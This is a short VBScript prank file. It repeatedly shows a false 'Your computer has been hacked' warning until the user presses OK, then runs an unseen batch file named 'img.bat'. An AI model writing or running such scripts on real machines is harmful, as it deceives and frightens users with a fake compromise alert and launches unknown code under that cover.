do
	Response = MsgBox("Your computer has been hacked, Press OK to accept", 1+48, "Urgent Warning!")
	If Response = vbOk Then
		Exit Do
	End If
loop

CreateObject("WScript.Shell").Run "img.bat"